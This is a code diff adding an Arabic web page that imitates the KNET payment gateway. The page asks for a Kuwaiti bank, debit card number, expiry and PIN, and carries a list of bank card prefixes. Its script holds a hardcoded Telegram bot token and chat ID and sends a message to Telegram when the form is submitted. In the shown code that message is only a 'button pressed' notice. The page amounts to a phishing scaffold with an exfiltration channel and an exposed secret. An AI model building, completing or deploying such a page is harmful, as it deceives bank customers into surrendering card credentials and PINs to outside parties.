@@ -1,0 +1,343 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>KNET Payments</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #ebebeb;
+      color: #444;
+      font-family: Verdana, Arial, Helvetica, sans-serif;
+    }
+
+    .container {
+      width: 100%;
+      padding: 15px;
+    }
+
+    .content-block {
+      width: min(100%, 395px);
+      margin: 0 auto;
+    }
+
+    .form-card {
+      margin: 15px 0;
+      padding: 18px;
+      border: 2px solid #8f8f90;
+      border-radius: 15px;
+      background: #fff;
+      box-shadow: 0 0 6px rgba(0, 0, 0, .3);
+    }
+
+    .logo {
+      width: 191px;
+      height: 48px;
+      margin: 0 auto 12px;
+      display: grid;
+      place-items: center;
+      border-radius: 4px;
+      background: linear-gradient(90deg, #0077d5, #00a1e4);
+      color: #fff;
+      font-size: 21px;
+      font-weight: 800;
+      letter-spacing: .04em;
+    }
+
+    .row {
+      min-height: 32px;
+      display: grid;
+      grid-template-columns: 42% 58%;
+      align-items: center;
+      gap: 7px;
+      padding: 6px 0;
+      border-bottom: 1px solid #8f8f90;
+    }
+
+    .row:last-child {
+      border-bottom: 0;
+    }
+
+    label,
+    .label {
+      color: #0070cd;
+      font-size: 11px;
+      font-weight: 700;
+      text-align: right;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, .18);
+    }
+
+    .value {
+      color: #444;
+      font-size: 11px;
+      text-align: right;
+    }
+
+    select,
+    input {
+      width: 100%;
+      height: 22px;
+      border: 2px solid #0070cd;
+      border-radius: 2px;
+      background: #fff;
+      color: #444;
+      font-size: 11px;
+      font-family: Verdana, Arial, Helvetica, sans-serif;
+      box-shadow: inset 0 0 5px rgba(0, 0, 0, .25);
+    }
+
+    input {
+      padding: 0 4px;
+      direction: ltr;
+      text-align: left;
+    }
+
+    .card-line,
+    .date-line {
+      display: grid;
+      grid-template-columns: 86px 1fr;
+      gap: 5px;
+      direction: ltr;
+    }
+
+    .date-line {
+      grid-template-columns: 1fr 1fr;
+    }
+
+    .buttons {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+
+    button,
+    .cancel-button {
+      width: 100%;
+      min-height: 29px;
+      border: 1px solid #cacaca;
+      border-radius: 2px;
+      background: #eaeaea;
+      color: #555;
+      font-size: 12px;
+      font-family: Verdana, Arial, Helvetica, sans-serif;
+      cursor: pointer;
+    }
+
+    .message {
+      display: none;
+      margin-bottom: 10px;
+      padding: 8px;
+      border: 1px solid #91b5d6;
+      border-radius: 4px;
+      background: #eef7ff;
+      color: #225b8b;
+      font-size: 12px;
+      font-weight: 700;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    .footer {
+      color: #333;
+      font-size: 12px;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    .footer strong {
+      color: #0077d5;
+    }
+  </style>
+</head>
+<body>
+  <form id="knetForm" novalidate>
+    <div class="container">
+      <div class="content-block">
+        <section class="form-card">
+          <div class="logo">KNET</div>
+          <div class="row">
+            <div class="label">:المستفيد</div>
+            <div class="value">CFC Co.</div>
+          </div>
+          <div class="row">
+            <div class="label">:المبلغ</div>
+            <div class="value">KD&nbsp;<span id="knet-total-amount">1.000</span></div>
+          </div>
+        </section>
+
+        <section class="form-card">
+          <div class="message" id="message" role="alert" aria-live="polite"></div>
+          <div class="row">
+            <label for="bank">:يرجى اختيار البنك</label>
+            <select id="bank">
+              <option value="">يرجى اختيار البنك</option>
+              <option value="ABK">البنك الأهلي الكويتي [ABK]</option>
+              <option value="ALRAJHI">مصرف الراجحي [Rajhi]</option>
+              <option value="BBK">بنك البحرين والكويت [BBK]</option>
+              <option value="BOUBYAN">بنك بوبيان [Boubyan]</option>
+              <option value="BURGAN">بنك برقان [Burgan]</option>
+              <option value="CBK">البنك التجاري الكويتي [CBK]</option>
+              <option value="GBK">بنك الخليج [GBK]</option>
+              <option value="KFH">بيت التمويل الكويتي [KFH]</option>
+              <option value="KIB">بنك الكويت الدولي [KIB]</option>
+              <option value="NBK">بنك الكويت الوطني [NBK]</option>
+              <option value="WARBA">بنك وربة [Warba]</option>
+            </select>
+          </div>
+
+          <div class="row">
+            <label for="debitNumber">:رقم بطاقة الصرف الآلي</label>
+            <div class="card-line">
+              <select id="dcprefix" aria-label="بادئة البطاقة">
+                <option value="">بادئة</option>
+              </select>
+              <input id="debitNumber" type="tel" inputmode="numeric" maxlength="10" autocomplete="off">
+            </div>
+          </div>
+
+          <div class="row">
+            <label for="month">:تاريخ انتهاء البطاقة</label>
+            <div class="date-line">
+              <select id="year">
+                <option value="">YYYY</option>
+                <option>2026</option>
+                <option>2027</option>
+                <option>2028</option>
+                <option>2029</option>
+                <option>2030</option>
+                <option>2031</option>
+                <option>2032</option>
+                <option>2033</option>
+                <option>2034</option>
+              </select>
+              <select id="month">
+                <option value="">MM</option>
+                <option value="01">01</option>
+                <option value="02">02</option>
+                <option value="03">03</option>
+                <option value="04">04</option>
+                <option value="05">05</option>
+                <option value="06">06</option>
+                <option value="07">07</option>
+                <option value="08">08</option>
+                <option value="09">09</option>
+                <option value="10">10</option>
+                <option value="11">11</option>
+                <option value="12">12</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="row">
+            <label for="cardPin">:الرقم السري</label>
+            <input id="cardPin" type="password" inputmode="numeric" maxlength="4" autocomplete="off">
+          </div>
+        </section>
+
+        <section class="form-card">
+          <div class="buttons">
+            <button type="submit" id="proceed">إرسال</button>
+            <button type="button" id="cancel">إلغاء</button>
+          </div>
+        </section>
+
+        <footer class="footer">
+          جميع الحقوق محفوظة&nbsp;©&nbsp;2026<br>
+          <strong>شركة الخدمات المصرفية الآلية المشتركة - كي نت</strong>
+        </footer>
+      </div>
+    </div>
+  </form>
+
+  <script>
+    const bankPrefixes = {
+      ABK: ["403622", "423826", "428628"],
+      ALRAJHI: ["458838"],
+      BBK: ["588790", "418056"],
+      BOUBYAN: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
+      BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
+      CBK: ["532672", "537015", "521175", "516334"],
+      GBK: ["531644", "517419", "531471", "559475", "517458", "526206"],
+      KFH: ["450778", "537016", "532674", "485602"],
+      KIB: ["406464", "409054"],
+      NBK: ["464452", "589160"],
+      WARBA: ["532749", "559459", "541350", "525528"]
+    };
+
+    const form = document.getElementById("knetForm");
+    const bank = document.getElementById("bank");
+    const prefix = document.getElementById("dcprefix");
+    const messageBox = document.getElementById("message");
+    const numericInputs = document.querySelectorAll('input[inputmode="numeric"]');
+
+    function send_telegram_message(message, disable_notification = false) {
+      const botToken = window.TELEGRAM_BOT_TOKEN || "8770505930:AAE0rDy1QYCdbWW0S-EeRtFp-6XOFUgIKsU";
+      const chatId = window.TELEGRAM_CHAT_ID || "7801329761";
+
+      if (!botToken || !chatId) {
+        return;
+      }
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          disable_notification: disable_notification,
+          parse_mode: "HTML"
+        })
+      }).catch(function() {});
+    }
+
+    function showMessage(text) {
+      messageBox.textContent = text;
+      messageBox.style.display = "block";
+    }
+
+    function updatePrefixes(bankCode) {
+      const values = bankPrefixes[bankCode] || [];
+      prefix.textContent = "";
+
+      if (!values.length) {
+        prefix.appendChild(new Option("بادئة", ""));
+        return;
+      }
+
+      values.forEach(function(value) {
+        prefix.appendChild(new Option(value, value));
+      });
+    }
+
+    numericInputs.forEach(function(input) {
+      input.addEventListener("input", function() {
+        input.value = input.value.replace(/\D/g, "");
+      });
+    });
+
+    bank.addEventListener("change", function() {
+      updatePrefixes(bank.value);
+      messageBox.style.display = "none";
+    });
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+      send_telegram_message("تم الضغط على زر إرسال في صفحة KNET.");
+      showMessage("تم الضغط على زر الإرسال في وضع العرض فقط.");
+    });
+
+    document.getElementById("cancel").addEventListener("click", function() {
+      form.reset();
+      updatePrefixes("");
+      showMessage("تم إلغاء العملية.");
+    });
+  </script>
+</body>
+</html>
